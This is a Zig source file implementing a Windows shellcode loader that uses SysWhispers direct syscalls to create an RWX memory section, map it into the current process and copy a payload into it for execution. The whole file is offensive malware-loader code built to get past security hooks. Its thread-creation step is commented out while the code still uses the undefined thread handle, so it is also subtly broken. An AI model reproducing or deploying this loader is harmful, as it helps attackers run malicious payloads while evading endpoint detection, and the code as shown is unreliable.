const std = @import("std");
const windows = std.os.windows;
const HANDLE = windows.HANDLE;
const PVOID = windows.PVOID;
const NTSTATUS = windows.NTSTATUS;
//const LARGE_INTEGER = windows.LARGE_INTEGER;
const kernel32 = windows.kernel32;

extern "c" fn NtMapViewOfSection(
    SectionHandle: windows.HANDLE,
    ProcessHandle: windows.HANDLE,
    BaseAddress: *?*anyopaque,
    ZeroBits: windows.ULONG_PTR,
    CommitSize: windows.SIZE_T,
    SectionOffset: ?*windows.LARGE_INTEGER,
    ViewSize: *windows.SIZE_T,
    InheritDisposition: u32, // SECTION_INHERIT enum
    AllocationType: windows.ULONG,
    Win32Protect: windows.ULONG,
) c_long;

// Import SysWhispers
const sw = @cImport({
    @cInclude("syscalls.h");
});

// Constants

const LARGE_INTEGER = union {
    parts: struct {
        HighPart: i32,
        LowPart: u32,
    },
    quad_part: i64,
};
const Pair = packed struct {
    LowPart: u32,
    HighPart: u32,
};

const SECTION_MAP_WRITE = 0x0002;
const SECTION_MAP_READ = 0x0004;
const SECTION_MAP_EXECUTE = 0x0008;
const SECTION_EXTEND_SIZE = 0x0010;
const SECTION_QUERY = 0x0001;
const STANDARD_RIGHTS_REQUIRED = 0x000F0000;

const SECTION_ALL_ACCESS = SECTION_MAP_WRITE |
    SECTION_MAP_READ |
    SECTION_MAP_EXECUTE |
    SECTION_EXTEND_SIZE |
    SECTION_QUERY |
    STANDARD_RIGHTS_REQUIRED;

const PAGE_EXECUTE_READWRITE = 0x40;
const SEC_COMMIT = 0x8000000;
//const ViewShare = 1;
const THREAD_ALL_ACCESS = 0x1F03FF;

const CURRENT_PROCESS = windows.GetCurrentProcess();
//onst CURRENT_PROCESS: HANDLE = @ptrFromInt(~@as(usize, 0));
pub extern "kernel32" fn GetThreadId(
    Thread: HANDLE,
) callconv(@import("std").os.windows.WINAPI) u32;

pub fn LocalMappingInjectionViaSyscalls(pPayload: [*]const u8, sPayloadSize: usize) bool {
    var hSection: ?HANDLE = null;
    var hThread: HANDLE = undefined;
    _ = &hThread; // Silence the warning
    var pAddress: ?*anyopaque = null;
    //_ = &pAddress; // Silence the warning
    var STATUS: c_long = undefined;
    var sViewSize: windows.SIZE_T = undefined;
    // var sViewSize: usize = undefined;

    std.debug.print("sPayloadSize: {}\n", .{sPayloadSize});

    var m_size: windows.LARGE_INTEGER = @as(i64, @intCast(sPayloadSize));

    // var m_size: Pair = @bitCast(@as(u64, sPayloadSize));
    std.debug.print("Section size requested: {}\n", .{m_size});

    // Allocating local map view
    STATUS = sw.Sw3NtCreateSection(&hSection, windows.SECTION_ALL_ACCESS, null, @ptrCast(&m_size), PAGE_EXECUTE_READWRITE, windows.SEC_COMMIT, null);
    if (STATUS != 0) {
        // std.debug.print("[!] NtCreateSection Failed With Error : 0x{X:0>8}\n", .{STATUS});
        std.debug.print("[!] NtCreateSections.... Failed With Error : 0x{X:0>8}\n", .{@as(u32, @bitCast(STATUS))});

        return false;
    }

    std.debug.print("Debug Info:\n", .{});
    //std.debug.print("hSection: 0x{X}\n", .{@intFromPtr(hSection)});
    std.debug.print("CURRENT_PROCESS: 0x{X}\n", .{@intFromPtr(CURRENT_PROCESS)});
    //std.debug.print("Initial pAddress: 0x{X}\n", .{pAddress});
    std.debug.print("ViewShare value: {}\n", .{sw.ViewShare});

    // Allocating the view
    STATUS = NtMapViewOfSection(hSection.?, windows.GetCurrentProcess(), &pAddress, 0, 0, null, &sViewSize, 1, 0, windows.PAGE_EXECUTE_READWRITE);

    std.debug.print("Debug Info after NtMapViewOfSection:\n", .{});
    std.debug.print("STATUS: 0x{X:0>8}\n", .{STATUS});
    //std.debug.print("AFTER pAddress: 0x{X}\n", .{pAddress});
    std.debug.print("Final sViewSize: {}\n", .{sViewSize});

    if (STATUS != 0) {
        std.debug.print("[!] NtMapV_iewOf_Section Failed With Error : 0x{X:0>8}\n", .{@as(u32, @bitCast(STATUS))});
        return false;
    }
    std.debug.print("[+] Allo_cated Address At : 0x{*} Of Size : {}\n", .{ pAddress, sViewSize });

    // Writing the payload
    std.debug.print("[#] Press <Enter> To Write The Payload ...\n", .{});
    _ = std.io.getStdIn().reader().readByte() catch {};
    @memcpy(@as([*]u8, @ptrCast(pAddress)), pPayload[0..sPayloadSize]);
    std.debug.print("\t[+] Payloadd is Copied From 0x{*} To 0x{*}\n", .{ pPayload, pAddress });

    // Executing the payload via thread creation
    std.debug.print("[#] Press <Enter> To Run The Payload ...\n", .{});
    _ = std.io.getStdIn().reader().readByte() catch {};
    std.debug.print("\t[i] Running Threads Of Entry 0x{*} ...\n", .{pAddress});
    // STATUS = sw.NtCreateThreadEx(hThread, THREAD_ALL_ACCESS, null, CURRENT_PROCESS, pAddress, null, 0, 0, 0, 0, null);
    if (STATUS != 0) {
        std.debug.print("[!] NtCreate_ThreadEx Failed With Error : 0x{X:0>8}\n", .{STATUS});
        return false;
    }
    std.debug.print("[+] DONE\n", .{});
    std.debug.print("\t[+] Thread Created With Id : {}\n", .{GetThreadId(hThread)});
    //Sw3NtClose
    // Closing the section handle
    STATUS = sw.Sw3NtClose(hSection);
    if (STATUS != 0) {
        std.debug.print("[!] NtClose Failed With Error : 0x{X:0>8}\n", .{STATUS});
        return false;
    }

    return true;
}
